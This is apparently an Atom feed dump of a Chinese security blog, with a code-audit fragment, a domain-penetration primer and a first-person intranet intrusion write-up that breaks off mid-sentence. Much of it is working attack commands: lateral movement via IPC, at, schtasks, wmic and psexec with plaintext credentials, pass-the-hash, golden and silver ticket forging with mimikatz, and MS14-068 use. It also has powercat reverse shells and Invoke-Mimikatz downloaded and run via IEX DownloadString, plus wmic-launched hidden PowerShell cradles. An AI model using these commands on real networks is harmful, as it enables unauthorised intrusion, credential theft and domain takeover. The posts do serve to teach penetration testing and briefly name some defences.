alt="" loading="lazy"></p><p>跟进filename方法，此方法获取写入文件的路径，保存在../Application/Runtime/Temp目录下</p><pre class=" language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">filename</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$name</span>    <span class="token operator">=</span>    <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_CACHE_KEY'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_CACHE_SUBDIR'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 使用子目录</span>            <span class="token variable">$dir</span>   <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_PATH_LEVEL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$dir</span>    <span class="token punctuation">.</span><span class="token operator">=</span>    <span class="token variable">$name</span><span class="token punctuation">{</span><span class="token variable">$i</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">,</span><span class="token number">0755</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$filename</span>    <span class="token operator">=</span>    <span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$filename</span>    <span class="token operator">=</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>并将S传入的name进行md5值作为文件名，最终通过file_put_contents函数写入文件。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/16.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;where注入&quot;&gt;&lt;a href=&quot;#where注入&quot; class=&quot;headerlink&quot; title=&quot;where注入&quot;&gt;&lt;/a&gt;&lt;strong&gt;where注入&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在控制器中，写个demo，利用字符串方式作为where传参时存在注
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>内网域渗透知识总结</title>
    <link href="http://yoursite.com/2019/12/31/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/12/31/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</id>
    <published>2019-12-31T03:30:29.000Z</published>
    <updated>2020-04-29T05:17:33.373Z</updated>
    
    <content type="html"><![CDATA[<h4 id="NTML协议"><a href="#NTML协议" class="headerlink" title="NTML协议"></a><strong>NTML协议</strong></h4><p>在工作组中，密码hash保存在本地的SAM文件中(%SystemRoot%\system32\config\sam)，在域里保存在ntds.dit文件中，hash的格式为：<code>用户名称:SID:LM-Hash值:NT-Hash值</code></p><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:32057716c8bd0647d9197a9db0b041eb:::</code></pre><p>500冒号后面的是LM hash，32057716c8bd0647d9197a9db0b041eb是ntml hash</p><h5 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a><strong>LM Hash</strong></h5><p>LM Hash的全称是LAN Manager Hash，如果明文是<code>dbnames</code>，先要全部转换成大写，然后将大写字符串转换成16进制，如果明文大写转换的二进制不足14个字节，需要用0在后面添加到14个字节</p><pre><code>44424e414d455300000000000000    dbnames的16进制为44424e414d4553</code></pre><p>由于44424e414d4553转换二进制为8字节，所以这两个8字节数据要用魔术字符串<code>KGS!@#$%</code>DES加密</p><pre><code>4B47532140232425     为&#39;KGS!@#$%&#39;的16进制</code></pre><p>将得到的2个8字节作为key对KGS!@#$%进行des加密，可以利用安全客的一篇文章进行<a href="https://www.anquanke.com/post/id/193149#h3-2" target="_blank" rel="noopener">des加密</a></p><pre><code>44424e414d4553作为key为&#39;KGS!@#$%&#39;进行des加密：c8b9d6dc8e553d6300000000000000作为key为&#39;KGS!@#$%&#39;进行des加密：aad3b435b51404ee</code></pre><h5 id="NTML-Hash"><a href="#NTML-Hash" class="headerlink" title="NTML Hash"></a><strong>NTML Hash</strong></h5><p>从Windows Vista开始，密码默认情况是只有存储NTML Hash，LM Hash不会存在，在NTML Hash中，先将字符串进行16进制转换，然后在转换成unicode字符串，最后使用MD4加密算法对Unicode进行加密，所以LM Hash跟NTML相比，LM明文大小写不敏感，可以判断明文是否小于8位，不使用‘KGS!@#$%’作为key进行des加密，而NTML采用单向加密方式(MD4)</p><h5 id="NTML认证协议"><a href="#NTML认证协议" class="headerlink" title="NTML认证协议"></a><strong>NTML认证协议</strong></h5><p>NTML协议认证分为三部分：协商、质询、身份验证验证</p><pre><code>                            1.协商Client &lt;----------------------------------------------------&gt;server                            2.质询(challenge)Client &lt;----------------------------------------------------&gt;server                            3.身份验证Client &lt;----------------------------------------------------&gt;server</code></pre><p>NTML协议认证过程：</p><p>1.用户输入账号密码，客户端中包含明文用用户名向服务端发起请求</p><p>2.服务端接收到客户端的请求，会生成一个challenge 16位随机数，使用存储的NTML Hash加密challenge，生成challenge1，然后将challenge的16位明文随机数发送给客户端</p><p>3.客户端接收到challenge后，使用用户登录的密码hash加密challenge生成response(challenge2)，将这个response发送给客户端</p><p>4.服务端接收到response，对challenge1和challenge2进行比较，相同的话就验证成功</p><h5 id="NTLM-v1与NTLM-v2"><a href="#NTLM-v1与NTLM-v2" class="headerlink" title="NTLM v1与NTLM v2"></a><strong>NTLM v1与NTLM v2</strong></h5><p>challenge：NTML v1是8的随机数；NTML v2是16位的随机数</p><p>Net-NTML Hash：</p><p>1.NTML v1采用的是DES加密，在16字节后面填充5个0，组成21字节，然后分成3组7个字节的，并在每7个字节后面填充1个0，成为3个8字节的DES密钥，加密上诉步骤2(server)发来的challenge，组成24字节的密文。</p><p>2.NTML v2采用的HMAC-MD5加密</p><h4 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a><strong>Kerberos协议</strong></h4><p>在域环境中，主要采用的是kerberos协议，主要有下面几个角色</p><p>1.AS：为客户端生成TGT服务</p><p>2.TGS：为客户端生成某个服务的ticket</p><p>3.KDC：安全认证中票据生成管理服务，里面包含AS和TGS</p><p>4.AD：存储整个域内的所有计算机，用户等信息</p><h5 id="Kerberos协议认证过程"><a href="#Kerberos协议认证过程" class="headerlink" title="Kerberos协议认证过程"></a><strong>Kerberos协议认证过程</strong></h5><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201912/31/102901ze0er0rhuutesc5y.png.thumb.jpg" alt="1" loading="lazy"></p><p>1.客户端向KDC(AS)发起一个认证请求(KRB_AS_REQ)，在请求的过程中，是通过用户的密码hash加密的时间戳，然后发送给AS服务器，AS服务器接收到后，采用服务器那边的密码hash进行解密这个时间戳，解密成功后，并且时间戳在一定时间范围，说明认证成功。<br> 2.AS对比用户是否在本地数据库中，使用客户端的hash进行解密，正确就返回krbtgt的密码hash加密的TGT票据(到期时间一般为8小时)，用户是无法解密这个TGT票据的，但是有了krbtgt的hash，就可以伪造’黄金票据’。还要返回一个由客户端用户ntml hash加密的Session Key(sessionkey1)，Session  Key是KDC接收请求后的随机生成的字符(KRB_AS_REP)。<br> 3.客户端用自己的密码hash解密Session Key，TGT是KDC加密的，Client无法解密，Client拿着解密出来的SessionKey去加密时间戳和TGT发送给TGS换取访问Server的票据(KRB_TGS_REQ)。<br> 4.TGS收到Client的请求后，会验证是否存在客户端要访问的这个服务，存在的话KDC使用krbtgt的密码hash对TGT进行解密，然后会查看TGT中的时间戳，看是否TGT失效，如果解密成功的TGT没有失效，向客户端发送通过sessionkey1加密的Session_key和ticket票据，在TGSREP中，用的是服务的hash加密ticket的，所有我们拥有这个服务的hash就可以制作一个ticket(即白银票据)(KRB_TGS_REP)。<br> 5.客户端拿着自己sessionkey1解密的Session_Key(sessionkey2)，然后把sessionkey2加密的时间戳和ticket发送个Server去访问服务，认证通过就可以访问(KRB_AP_REQ)。<br> 6.服务使用自己的hash去解密ticket票据，得到sessionkey2，在用sessionkey2去解密时间戳，解密成功，就用PAC去KDC问客户端是否有访问的权限，域控解密PAC，用于让客户端识别是否访问正确的服务端(KRB_AP_REP)。</p><h4 id="内网横向移动的方法"><a href="#内网横向移动的方法" class="headerlink" title="内网横向移动的方法"></a><strong>内网横向移动的方法</strong></h4><h5 id="ipc连接"><a href="#ipc连接" class="headerlink" title="ipc连接"></a><strong>ipc连接</strong></h5><pre><code>net use \\192.168.1.232\C$ admin123456 /user:fanxing.com\fanxing</code></pre><p>复制文件到主机上</p><pre><code>copy 1.bat \\192.168.1.232\c$\tools</code></pre><p>获取服务器的时间</p><pre><code>net time \\192.168.1.232</code></pre><p>创建计划任务，20:05执行1.bat文件，cobaltstrike上线成功</p><pre><code>at \\192.168.1.232 20:05 c:\tools\1.bat</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/3.png" alt="" loading="lazy"></p><p>下面是ipc连接当中常见的错误号：</p><pre><code>错误号5：拒绝访问---&gt;使用的权限太低，需要提权错误号51：Windows无法找到网络路径，网络有问题错误号53：找不到网络路径，ip地址错误、目标未开机、目标lanmanserver服务未开启、目标有防火墙(端口过滤)错误号67：找不到网络名-&gt;你的lanmanworkstation服务未启动或者目标删除了ipc$错误号1219：提供的凭据与已存在的凭据集冲突-&gt;你已经和对方建立了一个ipc，请删除在连接错误号1326：未知的用户名或错误密码错误号1792：试图登录，但是网络登录服务没启动-&gt;目标BetLogon服务未启动错误号2242：此用户的密码已经过期-&gt;目标有账号策略，强制定期要求更改密码</code></pre><h5 id="schtasks创建计划任务"><a href="#schtasks创建计划任务" class="headerlink" title="schtasks创建计划任务"></a><strong>schtasks创建计划任务</strong></h5><p>设置每天晚上8:40执行1.bat文件</p><pre><code>schtasks /create /s 192.168.1.232 /u fanxing.com\fanxing /p admin@163.com /ru &quot;SYSTEM&quot; /tn fanxing /sc DAILY /st 20:40  /tr c:\tools\1.bat /F</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/4.png" alt="" loading="lazy"></p><h5 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a><strong>WMI</strong></h5><p>wmi服务需要开启135端口，这个是默认开启的。</p><pre><code>wmic /node:192.168.1.232 /user:fanxing.com\fanxing /password:admin@163.com process call create &quot;cmd /c 1.exe&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/5.png" alt="" loading="lazy"></p><p>使用wmic没有任何回显，可以wmicexec.vbs解决无回显的问题，或者获取一个半交互式shell。</p><pre><code>cscript wmiexec.vbs /cmd 192.168.1.232 fanxing.com\fanxing admin@163.com whoami</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/6.png" alt="" loading="lazy"></p><h5 id="pstools"><a href="#pstools" class="headerlink" title="pstools"></a><strong>pstools</strong></h5><p>pstools中有13个小工具，这里主要利用psexec进行远程执行命令，唯一的缺点就是会开启一个服务，容易被管理员发现。</p><p>在ipc建立连接的时候，可以直接使用psexec:</p><pre><code>psexec.exe \\192.168.1.232 -h cmd /c &quot;whoami&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/7.png" alt="" loading="lazy"></p><p>当ipc没有连接时</p><pre><code>Psexec.exe \\192.168.1.232 -u fanxing.com\fanxing -p admin@163.com -h cmd /c &quot;whoami&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/8.png" alt="" loading="lazy"></p><p>使用metasploit执行</p><pre><code>use auxiliary/admin/smb/p**ec_commandset rhosts 192.168.1.232set smbuser fanxingset smbpass admin@163.comset smbdomain fanxing.comset command whoami</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/9.png" alt="" loading="lazy"></p><h5 id="hash传递-PTH"><a href="#hash传递-PTH" class="headerlink" title="hash传递(PTH)"></a><strong>hash传递(PTH)</strong></h5><p>hash传递是通过密码的hash访问主机或者服务，不需要明文登录。hash的原理，出现在上面讲的NTML认证过程的challenge。利用metasploit：</p><pre><code>use exploit/windows/smb/psexecset rhosts 192.168.50.233set SMBPass 32057716c8bd0647d9197a9db0b041ebset SMBUser administratorset SMBDomain fanxing.com</code></pre><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a><strong>黄金票据</strong></h4><p>黄金票据是AS颁发给Client的TGT票据(TGT的有效时间为20分钟)，是通过域kerberos账户(KRBTGT)加密的。实现原理就是跳过了AS的认证过程，直接向KDC的TGS服务证明通过了AS服务。一般黄金票据都是域控的权限掉了的时候，修改了域控的密码，而krbtgt的密码没有被修改，就可以重新获取到域控权限。</p><p>满足黄金票据的条件有：</p><p>1.域的名称</p><p>2.域的SID值</p><p>3.域中KRBTGT的密码hash</p><p>4.伪造的用户名</p><p>在金票的利用过程中，可以使用mimikatz，cobaltstrike，metasploit来伪造。</p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><strong>Mimikatz</strong></h5><p>导出krbtgt的NTML Hash</p><pre><code>privilege::debug      #提权lsadump::dcsync /domain:fanxing.com /user:krbtgt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/10.png" alt="" loading="lazy"></p><p>获取域的SID值，不要后面的-500</p><pre><code>whoami /all</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/11.png" alt="" loading="lazy"></p><p>伪造金票</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /aes256:3df036f90aaf3a63a5cce96fc753f08beb5a2e61946e17cc7d5e6ce04b651b89 /user:fanxing /ticket:gold.kirbi</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/12.png" alt="" loading="lazy"></p><p>导入Golden Ticket</p><pre><code>kerberos::ptt c:\users\test\gold.kirbi</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/13.png" alt="" loading="lazy"></p><p>可以使用dir访问域控目录，要输入主机名，使用ip还是访问不到</p><pre><code>dir \\WIN-M34UCFJIPNQ\c$</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/14.png" alt="" loading="lazy"></p><p>mimikatz还有另外一中方法</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /rc4:8b3955c065502e33716d555d4421a723 /user:fanxing /ptt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/15.png" alt="" loading="lazy"></p><h5 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a><strong>CobaltStrike</strong></h5><p>在上线之后-&gt;执行-&gt;黄金票据</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/16.png" alt="" loading="lazy"></p><h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><strong>Metasploit</strong></h5><p>msf制作金票</p><pre><code>load kiwi</code></pre><p>生成Golden Ticket</p><pre><code>golden_ticket_create -d fanxing.com -k 8b3955c065502e33716d555d4421a723 -s S-1-5-21-3408186607-3793295459-3581146574 -u fanxing -t /tmp/golden.ticket</code></pre><p>将票据导入内存中</p><pre><code>kerberos_ticket_use /tmp/golden.ticket</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/17.png" alt="" loading="lazy"></p><p>dir访问目录成功</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/18.png" alt="" loading="lazy"></p><p>金票的创建，需要krbtgt的密码ntml hash，对于防御，只要定期的修改krbtgt的密码，就能使金票失效。</p><h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a><strong>白银票据</strong></h4><p>白银票据是TGS颁发给Client的ST票据，根据kerberos协议第5步，Server会对Clinet的ST票据利用Client的hash解密，所以这个过程不需要经过KDC，而且只能访问Server的服务一次。</p><p>满足一下条件，即可以伪造银票：</p><p>1.域的名称</p><p>2.域的SID值</p><p>3.域服务的NTML Hash</p><p>4.要伪造的用户名</p><p>5.目标服务器的kerberos服务</p><p>常用的服务名有</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/19.png" alt="" loading="lazy"></p><p>伪造银票</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /target:WIN-M34UCFJIPNQ.fanxing.com /service:cifs /rc4:dcd87fc42d9d8ac03dec5931a55ddd59 /user:fanxing /ptt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/20.png" alt="" loading="lazy"></p><p>对于银票的防御措施可以开启PAC，PAC只能KDC制作和查看，在注册表中添加一个ValidateKdcPacSignature为1</p><pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/21.png" alt="" loading="lazy"></p><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a><strong>MS14-068</strong></h4><p>Client向AS申请一张不包含PAC的TGT票据，会伪造一个PAC，在TGS_REP中，对伪造的PAC验证成功后，会返回一个新的TGT票据。</p><p>通过<a href="https://github.com/abatchy17/Window**ploits/tree/master/MS14-068" target="_blank" rel="noopener">MS14-068exp</a>利用</p><pre><code>MS14-068.exe -u 当前域用户@域名称 -p 当前域用户密码 -s sid值 -d 域控ip</code></pre><p>sid值通过whoami /all获取</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/22.png" alt="" loading="lazy"></p><p>然后会在目录下生成一个证书，利用mimikatz</p><pre><code>kerberos::ptc C:\wwwroot\TGT_xxxxx@fanxing.com.ccache</code></pre><p>就可以使用dir访问到域控的目录</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/23.png" alt="" loading="lazy"></p><p>对于ms14-068的防御可以打补丁KB3011780和使用winserver2012</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://www.anquanke.com/member/143805" target="_blank" rel="noopener">https://www.anquanke.com/member/143805</a></p><p>2.<a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;NTML协议&quot;&gt;&lt;a href=&quot;#NTML协议&quot; class=&quot;headerlink&quot; title=&quot;NTML协议&quot;&gt;&lt;/a&gt;&lt;strong&gt;NTML协议&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在工作组中，密码hash保存在本地的SAM文件中(%SystemRoot%
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>我的一次内网域渗透实战</title>
    <link href="http://yoursite.com/2019/08/14/%E6%88%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    <id>http://yoursite.com/2019/08/14/%E6%88%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</id>
    <published>2019-08-14T09:34:05.000Z</published>
    <updated>2020-04-29T07:16:59.297Z</updated>
    
    <content type="html"><![CDATA[<h4 id="CobaltStrike反弹shell"><a href="#CobaltStrike反弹shell" class="headerlink" title="CobaltStrike反弹shell"></a><strong>CobaltStrike反弹shell</strong></h4><p>通过CNVD-C-2019-48814获取到shell，由于这个网站存在ETES杀毒软件，写入jsp木马或者利用vbs，certutil，powershell下载msf木马均会被杀，这里可以利用powershell反弹shell的形式在自己的vps上获取到一个shell。具体这个漏洞怎么利用我不说了，网上很多复现文章。<br>在cobaltstrike生成一段powershell代码，插入payload</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/1.png" alt="" loading="lazy"></p><p>执行payload就会在cs上获取到一个会话</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/2.png" alt="" loading="lazy"></p><p>将cobaltstrike上的会话移到metasploit上(怎么移植，网上有很多教程)<br>在metasploit上接收到shell</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/3.png" alt="" loading="lazy"></p><h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a><strong>内网信息收集</strong></h4><p>查询域名称：net view /domain<br>查询域内计算机：net view /doamin:xx<br>查询域控制器时间：net time /domain<br>查询域管理用户：net group “domain admins” /domain<br>得到域控制主机名：net group “domain controllers” /domain<br>…..<br>获取域控主机名：net group “domain controllers” /domain</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/4.png" alt="" loading="lazy"></p><p>通过ping主机名获取域控ip地址</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/5.png" alt="" loading="lazy"></p><p>补丁情况：systeminfo</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/6.png" alt="" loading="lazy"></p><p>MS14-068打了补丁，无奈只能上mimikatz读取密码，但是有eset杀毒软件，一上传就被杀了，有没有免杀的mimikatz，幸好powershell没被拦截，通过Invoke-Mimikatz读取密码。</p><p>本地nc监听本地35602端口：</p><pre class=" language-shell"><code class="language-shell">nc -lvvp 35602</code></pre><p>在burpsuite上执行powercat反弹shell</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>powercat <span class="token operator">-</span>c ip地址 <span class="token operator">-</span>p 端口 <span class="token operator">-</span>e cmd</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/7.png" alt="" loading="lazy"></p><p>Invoke-Mimikatz读取密码</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/8.png" alt="" loading="lazy"></p><p>成功读取到域控的管理员账号密码</p><h4 id="拿下其他主机"><a href="#拿下其他主机" class="headerlink" title="拿下其他主机"></a><strong>拿下其他主机</strong></h4><p>有了域控账号密码，ip地址，就可以连接域控了，这里有很多种方法(ipc，wmic，p**ec，sc等等，这里我详细介绍3种方法)</p><h5 id="1-IPC连接"><a href="#1-IPC连接" class="headerlink" title="1.IPC连接"></a>1.IPC连接</h5><p>net use \ip地址\ipc$ 密码 /user:域控主机名\域控管理名<br>将文件copy到其他服务器上：copy 1.bat \ip地址\c$<br>获取服务器的时间：net time \ip地址<br>设置1.bat执行时间：at \ip地址 获取到的服务器时间 执行文件<br>删除ipc记录：net use \ip\ipc$ /del</p><h5 id="2-wmic"><a href="#2-wmic" class="headerlink" title="2.wmic"></a>2.wmic</h5><pre><code>wmic /node:ip地址 /user:用户名 /password:密码 process call create cmd.exe</code></pre><h5 id="3-psexec"><a href="#3-psexec" class="headerlink" title="3.psexec"></a>3.psexec</h5><pre><code>psexec \\ip地址 -u 用户名 -p 密码 cmd</code></pre><p>这里我通过wmic来连接，由于wmic没有回显</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/9.png" alt="" loading="lazy"></p><p>可以执行powershell反弹到cobaltstrike上，在移植到msf上面</p><pre class=" language-powershell"><code class="language-powershell">wmic <span class="token operator">/</span>node:ip地址 <span class="token operator">/</span>user:用户 <span class="token operator">/</span>password:密码 <span class="token keyword">process</span> call create <span class="token string">"cmd.exe /c powershell.exe -nop -w hidden -c \"</span><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'cs上生成的url'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\<span class="token string">""</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/10.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/11.png" alt="" loading="lazy"></p><p>在域控中进行下信息收集，获取域成员机器</p><pre><code>查询所有域控制器：dsquery server查询域内计算机：dsquery computer查询域用户：dsquery user查询域用户所在域组：net user 域账号 /domain查询域组所包含的用户：net group 域组名 /domain</code></pre><p>先获取域内计算机名</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/12.png" alt="" loading="lazy"></p><p>通过PING获取域成员主机的ip地址，然后再用域管理wmic进行连接反弹shell，获取的ip如下(没包括域控和存在web漏洞的ip)</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/13.png" alt="" loading="lazy"></p><p>cobaltstrike上线0.4和0.7的主机</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/14.png" alt="" loading="lazy"></p><p>在对0.11主机进行连接时，ipc出现了错误代码86，指定的网络密码不正确。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/15.png" alt="" loading="lazy"></p><p>应该是域管理限制了这个域用户登录这台主机，要其他域用户可能会登录，由于要system权限才可以利用mimikatz抓取密码，所以这里需要提权。</p><h4 id="域控提权"><a href="#域控提权" class="headerlink" title="域控提权"></a><strong>域控提权</strong></h4><p>systeninfo先查看下那些补丁<br>批量获取未打那些补丁</p><pre class=" language-cmd"><code class="language-cmd">systeminfo>micropoor.txt&(for %i in ( KB3164038 KB3141780 ... ) do @Type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a micropoor.txt</code></pre><p>获取到 